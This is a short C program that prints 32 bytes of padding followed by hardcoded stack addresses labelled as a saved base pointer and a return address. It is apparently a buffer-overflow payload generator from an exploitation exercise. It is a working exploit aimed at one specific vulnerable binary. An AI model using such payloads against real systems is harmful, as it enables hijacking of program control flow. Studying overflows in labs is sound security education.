#include <stdio.h>

int main(void)
{
    unsigned int addrs[] = {
        0xbffff538, // Base pointer ($ebp)
        0x0804851a, // Return address
    };

    printf("00001111222233334444555566667777");
    fwrite(addrs, sizeof(unsigned int), sizeof(addrs) / sizeof(addrs[0]), stdout);

    return 0;
}
